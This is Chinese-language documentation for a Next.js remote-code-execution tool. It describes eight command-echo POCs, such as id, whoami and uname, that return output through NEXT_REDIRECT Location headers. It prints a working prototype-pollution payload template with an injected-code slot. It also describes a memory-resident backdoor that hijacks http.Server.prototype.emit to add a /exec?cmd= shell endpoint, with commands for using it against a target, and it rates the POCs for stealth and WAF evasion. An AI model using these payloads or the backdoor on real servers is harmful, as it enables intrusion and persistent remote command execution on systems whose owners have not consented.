# Next.js RCE 检测POC详解

## POC列表

本工具内置了8种不同的检测POC，每种POC针对不同的检测场景和环境。

### POC 1: 基础回显检测

**命令**: `echo VULN_CHECK_SUCCESS`

**原理**: 使用最基础的echo命令，通过NEXT_REDIRECT机制将结果回显到Location头

**适用场景**: 
- 基础环境检测
- 快速验证代码执行能力

**回显位置**: `/login?result=VULN_CHECK_SUCCESS`

---

### POC 2: ID命令检测

**命令**: `id`

**原理**: 执行id命令获取当前用户身份信息

**适用场景**:
- 确认用户权限
- Linux/Unix环境检测
- 获取用户组信息

**回显位置**: `/login?a={用户信息}`

**示例输出**: `uid=0(root) gid=0(root) groups=0(root)`

---

### POC 3: Whoami命令检测

**命令**: `whoami`

**原理**: 获取当前执行用户名称

**适用场景**:
- 简单用户身份确认
- 跨平台检测 (Windows/Linux/Mac)

**回显位置**: `/test?user={用户名}`

**示例输出**: `root` 或 `www-data`

---

### POC 4: Hostname检测

**命令**: `hostname`

**原理**: 获取服务器主机名

**适用场景**:
- 确认目标主机
- 内网资产识别

**回显位置**: `/check?host={主机名}`

**示例输出**: `web-server-01`

---

### POC 5: Node.js版本检测

**命令**: `process.version`

**原理**: 直接读取Node.js进程版本信息（无需执行系统命令）

**适用场景**:
- 快速验证代码执行
- 不依赖系统命令
- 绕过命令执行限制

**回显位置**: `/api?v={版本号}`

**示例输出**: `v18.17.0`

---

### POC 6: 操作系统类型检测

**命令**: `process.platform`

**原理**: 读取Node.js进程的平台信息

**适用场景**:
- 识别操作系统类型
- 不依赖系统命令
- 快速环境判断

**回显位置**: `/os?type={平台}`

**可能输出**: `linux`, `win32`, `darwin` (Mac)

---

### POC 7: 系统信息详细检测

**命令**: `uname -a` (Linux/Mac) / 容错处理

**原理**: 
- 尝试执行uname命令获取完整系统信息
- 使用try-catch容错处理
- Windows环境返回WIN标记

**适用场景**:
- 获取详细系统信息
- Linux/Mac环境深度检测
- 带容错的多平台检测

**回显位置**: `/sys?info={系统信息}`

**示例输出**: `Linux hostname 5.15.0-1 #1 SMP x86_64 GNU/Linux`

---

### POC 8: 简化确认检测

**命令**: 无（仅触发重定向）

**原理**: 
- 不执行任何命令
- 仅触发NEXT_REDIRECT
- 最小化payload

**适用场景**:
- 快速确认漏洞存在
- 绕过命令过滤
- 最小化检测痕迹

**回显位置**: `/vuln?status=CONFIRMED`

---

## 检测策略

工具会按照以下策略进行检测：

1. **顺序检测**: 从POC 1开始依次尝试
2. **快速终止**: 一旦检测成功立即停止
3. **全面覆盖**: 如果前面的POC失败，继续尝试后续POC
4. **智能识别**: 检测多种响应标记（重定向、响应体、错误信息）

## 响应识别

工具通过以下方式识别漏洞：

### 1. HTTP状态码检测
- 307/308 重定向状态码
- 表明NEXT_REDIRECT成功触发

### 2. Location头检测
- 检查重定向URL中的关键字
- `VULN_CHECK_SUCCESS`
- `result=`, `user=`, `host=`, `status=CONFIRMED`

### 3. 响应体检测
- `VULN_CHECK_SUCCESS`
- `NEXT_REDIRECT`
- `$B1337`
- `__proto__`

## POC特点对比

| POC编号 | 依赖系统命令 | 跨平台 | 信息量 | 隐蔽性 | 推荐度 |
|---------|-------------|--------|--------|--------|--------|
| POC 1   | ✓           | ✓      | 低     | 中     | ⭐⭐⭐ |
| POC 2   | ✓           | ✗(Unix)| 高     | 低     | ⭐⭐⭐⭐ |
| POC 3   | ✓           | ✓      | 中     | 中     | ⭐⭐⭐⭐ |
| POC 4   | ✓           | ✓      | 中     | 中     | ⭐⭐⭐ |
| POC 5   | ✗           | ✓      | 中     | 高     | ⭐⭐⭐⭐⭐ |
| POC 6   | ✗           | ✓      | 中     | 高     | ⭐⭐⭐⭐⭐ |
| POC 7   | ✓           | ✓(容错)| 高     | 低     | ⭐⭐⭐⭐ |
| POC 8   | ✗           | ✓      | 低     | 极高   | ⭐⭐⭐⭐⭐ |

## 使用建议

1. **快速检测**: POC 5、6、8（不依赖系统命令，速度快）
2. **详细信息**: POC 2、7（获取完整系统信息）
3. **隐蔽检测**: POC 8（最小化payload）
4. **通用检测**: POC 3（跨平台兼容性好）

## 注意事项

1. **合法授权**: 仅在获得授权的系统上使用
2. **检测痕迹**: 所有POC都会在日志中留下记录
3. **容错处理**: POC 7包含容错，适合不确定环境
4. **编码问题**: 某些特殊字符可能需要URL编码
5. **WAF绕过**: 不同POC可能有不同的WAF规避效果

## 扩展POC

如需添加更多POC，可以在`exploit.go`中添加：

```go
echoPOC9 := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=你的代码;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/path?param='+res+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`
```

## 内存马POC

除了检测POC，工具还包含一个内存马POC：

**功能**: 
- 劫持`http.Server.prototype.emit`
- 添加`/exec?cmd=命令`接口
- 持久化后门，直到进程重启

**使用方式**:
```bash
./nextjs-rce-tool --shell --target http://target.com
curl "http://target.com/exec?cmd=whoami"
```

**返回格式**:
```json
{
  "success": true,
  "stdout": "root\n",
  "stderr": "",
  "error": null
}
```
